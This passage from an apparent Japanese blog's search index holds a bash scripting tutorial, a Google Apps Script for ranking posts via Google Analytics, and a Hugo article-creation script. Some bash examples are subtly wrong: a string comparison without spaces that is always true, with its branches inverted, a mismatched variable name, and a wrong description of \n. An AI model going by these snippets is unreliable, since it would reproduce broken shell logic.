)を使って実行することを、ソースファイルの先頭で宣言している。という事になります。\nこのソースファイルの1行目の記述を「シェバン」と言います。 /usr/local/bin/awk\nにあるコマンドを使ってソースファイルを実行( ./\u0026lt;ファイル名\u0026gt;）したい場合は、ソースファイルの先頭行に\n#!/usr/local/bin/awk\nと、記述します。\n考え方ですが、bashコマンドで実行する場合のメリットは、ファイルに闇雲に実行権限を与える必要がないことです。実行権限を与える方法は、一般的ではありますが注意も必要です。\nchmod の実行権限には +x で実行権限を付与する方法の他、0755 などの数字で付与する場合もあります。\nこれらをパーミッションと言います。\nヒント 考え方ですが、bashコマンドでファイルを実行する場合のメリットは、ファイルに実行権限をやみくもに与える必要がないことです。 同時に、第三者が簡単にファイルを実行できる事を防ぐ、自分自身が誤ってファイルを実行してしまうというケアレスミスを防ぐことができます。 実行権限を与える方法は、一般的ではありますが、注意も必要です。 パーミッションの確認\nターミナルのコマンドでカレントディレクトリ内のファイルやディレクトリの情報を確認します。\n$ls -l 上記のコマンドを実行すると、以下のような一覧が表示されるかと思います。\n-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt drwxr-xr-x 6 user group 20480 1月 1 00:00 ダウンロード パーミッションの読み方\n「-rw-r\u0026ndash;r\u0026ndash;」や「drwxr-xr-x」の先頭の謎の10文字についてですが、\n最初の１文字目はファイル種別を表しています。\n-rw-r\u0026ndash;r\u0026ndash;\n種別意味 -ファイル dディレクトリ lシンボリックリンク 2文字目から4文字目はファイルの所有者に対する権限を表し、\n5文字目から7文字目はファイルの所有グループに対する権限を表し、\n8文字目から10文字目はその他に対する権限を表しています\n上記から-rw-r\u0026ndash;r\u0026ndash;は、\n「ファイル種別」が「ファイル」であり、\n「所有者」に「読み取り」と「書き込み」の権限があり、\n「所有グループ」に「読み取り」の権限があり、\n「その他」に「読み取り」の権限があることを示しています。\ndrwxr-xr-xは、\n「ファイル種別」が「ディレクトリ」であり、\n「所有者」に「読み取り」と「書き込み」と「実行」の権限があり、\n「所有グループ」に「読み取り」と「実行」の権限があり、\n「その他」に「読み取り」と「実行」の権限があることを示しています。\nアクセス権限の変更\nアクセス権限を変更する方法について記載します。\nパーミッションの変更には chmodコマンドを使用します。\n数値で指定する\n$ ls -l　-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt $ chmod 764 hoge.txt $ ls -l -rwxrw-r-- 1 user group 9 1月 1 00:00 hoge.txt 上記のコマンドはhoge.txtに対してパーミッションの確認→変更→確認を行っています。\n$ chmod 764 hoge.txt に関して説明していきます。\nファイルのパーミッションの変更は以下の通りコマンドを実行すれば可能です。\nchmod モード 対象ファイル名 モードの数字について\nモード(数字)モード(アルファベット)権限 4r読み取り 2w書き込み 1x実行 上記の合計値を「所有者」「所有グループ」「その他」の順で入力することでパーミッションを変更することができます。 要するに上記の「764」は 「所有者」に対して「読み取り」「書き込み」「実行」を、 「所有グループ」に対して「読み取り」「書き込み」を、 「その他」に「読み取り」を付与しています。 ヒント 実行したい場合は $ chmod 755 \u0026lt;ファイル名\u0026gt; 読み取りのみを許可し、実行しない場合は $ chmod 644 \u0026lt;ファイル名\u0026gt; 自分だけの読み取りを許可する場合は $ chmod 600 \u0026lt;ファイル名\u0026gt; 通常は上記３種類しか使いません。 CGI などを使う場合は $ chown や $chgrp を組み合わせて使うことが多いです。 $ chmod 777 \u0026lt;ファイル名\u0026gt; というパーミッションを軽率に与えず、上手にコマンドを使いこなすことがセキュリティにつながります。 詳しくはこちら\nhttps://qiita.com/shisama/items/5f4c4fa768642aad9e06\necho コマンド echoコマンドの使用：\nさまざまなオプションでechoコマンドを使用できます。\n次の例では、いくつかの便利なオプションについて説明します。\nオプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。\n\u0026lsquo;-n\u0026rsquo;オプションは、改行なしでテキストを印刷するために使用され、\u0026rsquo;-e\u0026rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。\n\u0026rsquo;echo_example.sh\u0026rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;改行付きのテキストの印刷\u0026#34;; echo -n \u0026#34;改行なしのテキストの印刷\u0026#34;; echo -e \u0026#34;\\n削除\\tバックスラッシュ\\t文字\\n\u0026#34;; bashコマンドでファイルを実行します。\n$ bash echo_example.sh 改行付きのテキストの印刷 改行なしのテキストの印刷 削除\tバックスラッシュ\t文字 $ ヒント echo の利用例は果てしない。ここで説明してもだれも読みはしないだろう。なので、概要の抜粋を説明する echo でよく使われるオプションは以下の通り\nオプション\t意味\n-n\t最後の改行を出力しない -e\tエスケープシーケンスを解釈する -E\tエスケープシーケンスを解釈しない（デフォルト） エスケープシーケンスとは、上記のバックスラッシュのことだ。\n以下の4つを覚えておくだけでおおよそは事足りる。 オプション 意味\n\\r\tキャリッジリターン \\n\t改行（フォームフィード＋キャリッジリターン） \\t\t水平タブ \\\tバックスラッシュ コメント コメントの使用\n「#」記号は、bashスクリプトに1行コメントを追加するために使用されます。\n\u0026lsquo;comment_example.sh\u0026rsquo;という名前の新しいファイルを作成し、1行コメント付きの次のスクリプトを追加します。\n#!/bin/bash #2つの数値をsumに追加します ((sum=25+35)); #結果を出力します echo \u0026#34;$sum\u0026#34;; bashコマンドでファイルを実行します。\n$ bash comment_example.sh 60 $ ヒント 複数行コメントに関しては次の章で説明します。 マルチラインコメント 複数行コメントの使用\nbashではさまざまな方法で複数行コメントを使用できます。\n次の例に簡単な方法を示します。\n\u0026lsquo;multiline-comment.sh\u0026rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。\nここでは、「:」と「\u0026rsquo;」でbashで複数行コメントを実現しています。\n次のスクリプトは、5の2乗を計算します。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; 次のスクリプトは、 数値の2乗値5を計算します。 \u0026#39; ((area=5*5)); echo \u0026#34;$area\u0026#34;; bashコマンドでファイルを実行します。\n$ bash multiline-comment.sh 25 $ ヒント 多くの場合、マルチラインコメントの存在は知られていない。 ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。 それは、過去のメジャーソースコードの冒頭にそうあるからだ。 そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。 今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:\u0026gt;ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。\nif [ \u0026ldquo;$v\u0026rdquo; -eq 5 ];then\n: # 何もしない fi touchは既にファイルがあれば、そのファイルにはさわらない。\n:\u0026gt; は既にファイルがあれば、そのファイルさえも空にする。 上記 if 文の中の : は　何もしないことを示す。 マルチラインコメントも同じ「:」から始まり、何もしないことを示している。 while ループ whileループの使用\nwhileループの使用法を知るために、「while_example.sh」という名前のbashファイルを作成します。\nこの例では、whileループが5回繰り返されます。\ncount変数の値は、各ステップで1ずつ増加します。\ncount変数の値が5になると、whileループは終了します。\n#!/bin/bash valid=true; count=1 while [ \u0026#34;$valid\u0026#34; ];do echo \u0026#34;$count\u0026#34;; if [ \u0026#34;$count\u0026#34; -eq 5 ];then break; fi ((count++)); done bashコマンドでファイルを実行します。\n$ bash while_example.sh 1 2 3 4 5 $ ヒント 上記ソースでトリッキーなのはwhileよりもむしろ ((COUNT++))\nだろう。\nCOUNT = COUNT + 1; count=1\ncount=$(expr $count + 1) # =\u0026gt; 2 let ++count # =\u0026gt; 2 let count++ # =\u0026gt; 3 count=$((++count)) # =\u0026gt; 2 count=$((count++)) # =\u0026gt; 2 count=$((count += 1)) # =\u0026gt; 3 変数に代入する必要がないから $(( )) ではなく、\n(( )) でよい。(( )) の中の変数を表す「$」は記述の必要はない for ループ forループの使用\n基本的なforループ宣言を示します。\n\u0026lsquo;for_example.sh\u0026rsquo;という名前のファイルを作成し、forループを使用して、次のスクリプトを追加します。\nここでは、forループは10回繰り返され、変数のすべての値、counterを1行で出力します。\n#!/bin/bash for((counter=10;counter\u0026gt;0;counter--));do echo -n \u0026#34;$counter \u0026#34;; done printf \u0026#34;\\n\u0026#34; bashコマンドでファイルを実行します。\n$ bash for_example.sh 10 9 8 7 6 5 4 3 2 1 $ ヒント 以下、どの記法も同じ。書きやすいものを選べばいい。 # 冗長 for i in \\`seq 10\\` do echo \u0026#34;test\u0026#34; done # 簡素 for i in \\`seq 10\\`;do echo \u0026#34;test\u0026#34; done # C/Javaライク for((i=0;i\u0026lt;10;i++));do echo \u0026#34;test\u0026#34; done 対話型入力 ユーザー入力の取得\n\u0026lsquo;read\u0026rsquo;コマンドは、bashでユーザーから入力を受け取るために使用されます。\n\u0026lsquo;user_input.sh\u0026rsquo;という名前のファイルを作成し、ユーザーから入力を取得するための次のスクリプトを追加します。\nここでは、1つの文字列値がユーザーから取得され、他の文字列値を組み合わせて値が表示されます。\n#!/bin/bash echo \u0026#34;あなたの名前を入力して下さい\u0026#34; read name echo \u0026#34;ようこそ $name. ＮＬＰへ\u0026#34; bashコマンドでファイルを実行します。\n$ bash user_input.sh あなたの名前を入力して下さい suzuki ようこそ suzuki。 ＮＬＰへ $ ヒント 以下のソースは read コマンドの手前でechoすらしない -p オプションだ。 read -p \u0026ldquo;INPUT:\u0026rdquo; str\necho $str1 If 文 if文を使う\n単数、または複数の条件でif条件を使用できます。\nこのステートメントの開始ブロックと終了ブロックは、「if」と「fi」で定義されます。\n「simple_if.sh」という名前のファイルを作成し、bashでのifステートメントの使用を確認します。\nここでは、変数nに10が割り当てられています。\n$nの値が10未満の場合、出力は「1桁の数値です」になります。\nそれ以外の場合、出力は「2桁の数値です」になります。\n比較のために、ここでは「-lt」を使用しています。\nオプション意味 -eq同　じ（==） -lt小さい（＜） -gt大きい（＞） 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、\n-eq -lt -gt を使う必要があります。\n文字列を比較する場合は 「==」または 「!=」を使います。\n#!/bin/bash n=10; if [ $n -lt 10 ];then echo \u0026#34;1桁の数値です\u0026#34;; else echo \u0026#34;2桁の数値です\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash simple_if.sh 2桁の数値です $ ヒント 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。\nand 条件を if 文で使う ANDロジックでifステートメントを使用する：\n2つ以上の条件を持つifステートメントでは、さまざまなタイプの論理条件を使用できます。\nandロジックを使用してifステートメントで複数の条件を定義する方法を次の例に示します。\n\u0026lsquo;\u0026amp;\u0026amp;\u0026lsquo;は、ifステートメントのandロジックを適用するために使用されます。\n\u0026lsquo;if_with_and.sh\u0026rsquo;という名前のファイルを作成して、次のコードを確認します。\nここで、ユーザー名とパスワードの変数の値はユーザーから取得され、「admin」および「secret」と比較されます。\n両方の値が一致する場合、出力は「有効なユーザー」になります。一致しない場合、出力は「無効なユーザー」になります。\n数値を比較する場合は、「\u003c」「\u003e」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。 #!/bin/bash echo \u0026#34;名前を入力して下さい\u0026#34; read username echo \u0026#34;パスワードを入力して下さい\u0026#34; read password if [[ (\u0026#34;$username\u0026#34;==\u0026#34;admin\u0026#34; \u0026amp;\u0026amp; \u0026#34;$password\u0026#34;==\u0026#34;secret\u0026#34;) ]];then echo \u0026#34;無効なユーザーです\u0026#34;; else echo \u0026#34;有効なユーザーです\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash if_with_and.sh 名前を入力して下さい suzuki パスワードを入力して下さい password 無効なユーザーです $ ヒント 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-07-01-suzuki/","title":"【はじめから】ざっくりわかるシェルスクリプト１」"},{"content":"Hugoにはさまざまな機能があり、ブログを作るにはもってこいの静的サイトジェネレーターです。\n関連記事も取得できて、検索機能もある「至れり尽くせり」なジェネレーターだと思います。\nしかし、1点だけどうしても重要な機能がありません。\nそれは人気記事の表示です。\n人気記事を表示させようとすると、データベースを用意したりサーバのアクセスカウントを行う必要があります。\nそんな面倒なことはしたくありませんよね？\n今回はHugoでも簡単に人気の記事を表示する方法を紹介いたします。\n必要なもの Hugoで人気記事を出すために必要なものは、\nGoogleスプレッドシート Googleアナリティクス 以上です。\nそれでは実際の設定やプログラムを行っていきましょう。\nGoogleアナリティクスの設定 Googleアナリティクスをサイトに設定します。\n設定の際にはv4ではなく、v2が必要です。(2022年1月6日現在）\nv4を設定している場合は、同時にv2も設定する必要があります。\n「アカウントを作成」「アカウントの設定」をした後に、「プロパティの設定」で「ユニバーサル アナリティクス プロパティの作成」をONにするとv4とv2の両方でアナリティクスを設定できます。\nユニバーサル アナリティクス プロパティの作成 あとはv4とv2のコードをサイトに貼り付けるだけです。\n貼り付け方法はGoogleに書いてある通りです。\nスプレッドシートの設定 次にスプレッドシートを設定します。\nGoogleドライブで「新規」「Googleスプレッドシート」を選択してシートを作成します。\n作成したシートに適当な名前をつけます。\nその後に、「拡張機能」の「App Script」を押して、GoogleAppScript（GAS）に移動します。\nユニバーサル アナリティクス プロパティの作成 GASのプログラム 日付の取得 日付を計算するために、「daysjs」というライブラリを追加します。\nライブラリの＋をクリックして、以下を検索します。\n1ShsRhHc8tgPy5wGOzUvgEhOedJUQD53m-gd8lG2MOgs-dXC_aCZn9lFB 検索して、days.jsが表示されたら追加をします。\nday.jsライブラリの追加 これで日付の検索が可能になります。\n以下が日付のプログラムです。\n今日から1日、1月、1年前なのかという切り替えが可能です。\nyear: 今日から1年間の範囲 month: 今日から1か月の範囲 day: 今日から1日の範囲 function getDate(type) { let calc = \u0026#39;d\u0026#39;; switch(type) { case \u0026#34;month\u0026#34;: calc = \u0026#39;M\u0026#39;; break; case \u0026#34;year\u0026#34;: calc = \u0026#39;y\u0026#39;; break; default: calc = \u0026#39;d\u0026#39;; break; } const d1 = dayjs.dayjs().locale(\u0026#39;ja\u0026#39;); return {start: d1.subtract(1, calc).format(\u0026#39;YYYY-MM-DD\u0026#39;), end: d1.format(\u0026#39;YYYY-MM-DD\u0026#39;)}; } function test() { let d = getDate(\u0026#39;day\u0026#39;); console.log(d); } ここまでをテスト実行してみましょう。\nデバッグの隣りにあるセレクトを「test」にして、「実行」を押してみます。\n正常に終了されれば実行ログに結果と実行完了が表示されるはずです。\nGASとGoogleアナリティクスの連携 GASとアナリティクスの連携にはビューIDが必要です。\nビューIDはv2で取得できるので、v4とv2を設定したのはこのビューIDを取得するためになります。\nGASのプログラムにGoogleアナリティクスの「アカウント」「プロパティ」「ビュー」「ビューの設定」にあるビューIDを設定します。\n設定する際は「ga:ビューID」と ga: を付ける必要があります。\nさきほどのプログラムの下に、下記のプログラムを記述します。\nfunction getGoogleAnalytics(name) { const id = \u0026#34;ga:[GAビューID]\u0026#34;; const date = getDate(name); const response = AnalyticsReporting.Reports.batchGet({ reportRequests: [{ viewId: id, dateRanges: [{startDate:date.start,endDate: date.end}], samplingLevel: \u0026#39;LARGE\u0026#39;, metrics: [ {expression: \u0026#39;ga:pageviews\u0026#39;}, {expression: \u0026#39;ga:sessions\u0026#39;}, {expression: \u0026#39;ga:users\u0026#39;}, ], dimensions: [ {name: \u0026#39;ga:pagePath\u0026#39;} ], orderBys: [{ fieldName: \u0026#39;ga:pageviews\u0026#39;, sortOrder: \u0026#34;DESCENDING\u0026#34;, }], }] }); let rows = JSON.parse(response).reports[0].data.rows; rows = rows.filter(f =\u0026gt; /posts/.test(f.dimensions[0])).map(f =\u0026gt; { return f.dimensions.concat(f.metrics[0].values); }); let sheet = SpreadsheetApp.getActive().getSheetByName(name); sheet.clear(); rows.unshift([\u0026#34;link\u0026#34;, \u0026#34;pv\u0026#34;, \u0026#39;session\u0026#39;, \u0026#39;users\u0026#39;]); sheet.getRange(1, 1, rows.length, rows[0].length).setValues(rows); } function setMonth() { getGoogleAnalytics(\u0026#39;month\u0026#39;); } ここでは、ページのパスをキーとしてページビューとセッション、ユーザー数を集計するようにしています。\n並び順はpageviewsの数の降順です。\n必要なデータがあれば各自で編集することをオススメいたします。\nそして、各項目のラベルを出力するために、\nrows.unshift([\u0026#34;link\u0026#34;, \u0026#34;pv\u0026#34;, \u0026#39;session\u0026#39;, \u0026#39;users\u0026#39;]); として、先頭行のデータにラベル行を追加しています。\nこの部分も各自のデータに合うよう、調整してください。\nアナリティクスから取得したデータはスプレッドシートのシート名に紐付けるので、\ngetGoogleAnalytics(\u0026#39;month\u0026#39;); の場合は、「month」というシートにデータを反映するということになります。\nサービスの読み込み GASとアナリティクスを連携させるために、サービスを読み込みます。\nサービスのプラスマークをクリックして、「Analytics Reporting API」を選択、追加します。\n以上でサービスの読み込みは終わりです。\nそれでは、実行してみましょう。\n実行 まずははスプレッドシートに「month」という名前のシートを作ります。\nシートができたら、再度コードエディターに戻ります。\nさきほどのデバッグの隣りにあるセレクト「test」を「setMonth」にして、実行を押します。\n承認を求められるので、「権限を確認」を押します。\n使用するアカウントをクリクで選んで、「詳細」をクリックして、「〜（安全ではないページ）に移動」をクリックします。\nすると、アクセスの許可を求められるので、「許可」を押します。\n実行ログに結果と実行完了が表示されるはずです。\nスプレッドシートを確認すると、アナリティクスのデータが反映されているはずです\nこれで月間の人気記事の取得ができました。\n同じように日、年も設定しておきましょう。\nfunction setDay() { getGoogleAnalytics(\u0026#39;day\u0026#39;); } function setYear() { getGoogleAnalytics(\u0026#39;year\u0026#39;); } まとめ まずがGASとアナリティクスの連携ができました。\n次回はこのデータを使ってHugoとアナリティクスを連携して、人気記事を表示できるようにしたいと思います。\nここまでの全プログラムは下記になります。\nfunction getDate(type) { let calc = \u0026#39;d\u0026#39;; switch(type) { case \u0026#34;month\u0026#34;: calc = \u0026#39;M\u0026#39;; break; case \u0026#34;year\u0026#34;: calc = \u0026#39;y\u0026#39;; break; default: calc = \u0026#39;d\u0026#39;; break; } const d1 = dayjs.dayjs().locale(\u0026#39;ja\u0026#39;); return {start: d1.subtract(1, calc).format(\u0026#39;YYYY-MM-DD\u0026#39;), end: d1.format(\u0026#39;YYYY-MM-DD\u0026#39;)}; } function getGoogleAnalytics(name) { const id = \u0026#34;ga:[GAビューID]\u0026#34;; const date = getDate(name); const response = AnalyticsReporting.Reports.batchGet({ reportRequests: [{ viewId: id, dateRanges: [{startDate:date.start,endDate: date.end}], samplingLevel: \u0026#39;LARGE\u0026#39;, metrics: [ {expression: \u0026#39;ga:pageviews\u0026#39;}, {expression: \u0026#39;ga:sessions\u0026#39;}, {expression: \u0026#39;ga:users\u0026#39;}, ], dimensions: [ {name: \u0026#39;ga:pagePath\u0026#39;} ], orderBys: [{ fieldName: \u0026#39;ga:pageviews\u0026#39;, sortOrder: \u0026#34;DESCENDING\u0026#34;, }], }] }); let rows = JSON.parse(response).reports[0].data.rows; rows = rows.filter(f =\u0026gt; /posts/.test(f.dimensions[0])).map(f =\u0026gt; { return f.dimensions.concat(f.metrics[0].values); }); let sheet = SpreadsheetApp.getActive().getSheetByName(name); sheet.clear(); rows.unshift([\u0026#34;link\u0026#34;, \u0026#34;pv\u0026#34;, \u0026#39;session\u0026#39;, \u0026#39;users\u0026#39;]); sheet.getRange(1, 1, rows.length, rows[0].length).setValues(rows); } function setMonth() { getGoogleAnalytics(\u0026#39;month\u0026#39;); } function setDay() { getGoogleAnalytics(\u0026#39;day\u0026#39;); } function setYear() { getGoogleAnalytics(\u0026#39;year\u0026#39;); } 書籍の紹介 1週間でGoogleアナリティクス4の基礎が学べる本 (1週間で基礎が学べるシリーズ) 大幅に改訂されたWebマーケティングツール「Googleアナリティクス4」の基礎と活用法を最前線のWebマーケッターたちがやさしく解説! 本書は、WebマーケターのためにGoogleアナリティクス4（GA4・ジーエーフォー）の基礎知識を解説した入門書です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 詳解! Google Apps Script完全入門[第2版] ~GoogleアプリケーションとGoogle Workspaceの最新プログラミングガイド 今や私たちの仕事や生活に無くてはならない存在になったGoogleサービス。これらGoogleサービスの自動化や連携を行うことで、大幅な効率化が図れます。そして、それを可能にするのがGoogle Apps Script(GAS)です。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-06T16:50:50+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/analytics_hu3c7150185aea2714a4cee994a799664f_79251_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-06-01-wyoshi/","title":"簡単にできるHugoで人気の記事を表示する方法を詳しく解説"},{"content":"はじめに ここでは、hugoコマンドでnewする時に指定するファイル名を、シェルスクリプトを使ってなるべく簡便にあてはめてファイル生成しようというものです。\nhugo コマンドでgithub.ioディレクトリに記事を投稿する場合、以下のコマンドをたたくと思います。\n$ hugo new posts/＜ディレクトリ＞/index.md または\n$ hugo new posts/＜今日の日付＞.md 面倒なんですよね。。。\nディレクトリの指定 通常、記事毎にディレクトリを分けて、アクセスされるファイルをindex.mdにした場合は、以下の通りになりますよね。\n$ hugo new posts/＜今日の日付のディレクトリ＞/index.md ナンバリングの効用 ただ、同日に気分が乗ってきて、もう一つ記事を投稿しようとする場合は、日付の後ろに「-02」とか工夫する必要も出てきたりします。たとえば以下のように\n$ hugo new posts/＜今日の日付のディレクトリ＞-＜ナンバリング02＞/index.md 複数メンバーの投稿を区別する 複数のコラボレーターで投稿するgithub.ioの場合は、投稿者も区別したくなります。例えば\n$ hugo new posts/＜今日の日付のディレクトリ＞-＜作成者＞-＜ナンバリング02＞/index.md ようするに、シェルスクリプトを使って、以下のコマンドを実行したい訳です。\n$ hugo new posts/2022-01-06-01-suzuki/index.md 起動パラメータ と、なると、パラメータは以下の三つとなりますね。\n$today 今日の日付\n$number 記事のナンバリング\n$author 作成者\n実行イメージ # 作成者 suzuki の 01 番目の投稿記事 $ bash mkArticle.sh suzuki 01 $ hugo new posts/$today-$number-$author/index.md 気をつけるところは パラメータを省略したときの挙動 $ bash mkArticle.sh 実行した場合に、「作成者が指定されていないからやりなおしてね」というのもちょっと寂しいものがあります。指定していなければ、都度、聞いてきて欲しいものです。そこで readコマンドで作成者を尋ねてくる感じにします。\nif [ -z \u0026#34;$author\u0026#34; ]; then echo \u0026#34;ユーザー名を半角で入力\u0026#34;; read author; fi 同日ファイルの存在を確認 ２．すでに同日に一つ目の記事を投稿してある。要するに生成しようとしているファイルがすでに存在する場合の挙動です。こちらは、ファイルが存在していれば、１を応用して、別のナンバリングを指定するように尋ねてくれると良さそうです。\nwhile [ true ] ;do if [ -f \u0026#34;content/posts/$today-$number-$author/index.md\u0026#34; ]; then echo \u0026#34;$number ファイルが既に存在します。\u0026#34;; echo \u0026#34;別のナンバリングを指定して下さい 02とか03とか\u0026#34;; read number; else break; fi done ですので、ナンバリングの初期値は「01」としておいて、そのファイルが既に存在する場合は、あらためてユーザーにナンバリングを尋ねてくるという手法としました。\nif [ -z \u0026#34;$number\u0026#34; ]; then number=\u0026#34;01\u0026#34;; fi 実行方法 $ bash mkArticle.sh suzuki 01; 前述のとおり作成者、ナンバリングは省略可能です。 $ bash mkArticle.sh ソース全文 #!/bin/bash : \u0026#39;使い方 一つ目のパラメーターに作成者を指定します 二つ目のパラメータにナンバリングを指定します 一つ目 01(未指定の場合は01） 二つ目 02 （例) $ bash mkArticle.sh suzuki 01; \u0026#39; # #作成者 無指定であれば入力を促す author=$1; #今日の日付 today=$(date \u0026#34;+%Y-%m-%d%n\u0026#34;); #今日のインデクス 一つ目の投稿であれば01 二つ目の投稿であれば02 number=\u0026#34;$2\u0026#34;; # function getParam(){ if [ -z \u0026#34;$number\u0026#34; ]; then number=\u0026#34;01\u0026#34;; fi # if [ -z \u0026#34;$author\u0026#34; ]; then echo \u0026#34;ユーザー名を半角で入力\u0026#34;; read author; fi # while [ true ] ;do if [ -f \u0026#34;content/posts/$today-$number-$author/index.md\u0026#34; ]; then echo \u0026#34;$number ファイルが既に存在します。\u0026#34;; echo \u0026#34;別のナンバリングを指定して下さい 02とか03とか\u0026#34;; read number; else break; fi done } # function execHugo(){ echo \u0026#34;\u0026#34;; echo \u0026#34;hugoコマンドを実行します\u0026#34;; echo \u0026#34;hugo new posts/$today-$number-$author/index.md\u0026#34; hugo new posts/$today-$number-$author/index.md # 処理終了 echo \u0026#34;ファイルの編集は以下の通りです。\u0026#34; echo \u0026#34;vim content/posts/$today-$number-$author/index.md;\u0026#34; } # # パラメータの取得 getParam; # hugoコマンドの実行 execHugo; exit; # おわりに 日頃、手間を掛けてコマンドを入力している場合は、シェルスクリプトを使って簡便にできる事に加え、さらにカスタマイズを加え、便利に記事投稿ができるとブログも気分もがぜん盛り上がりますね。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る 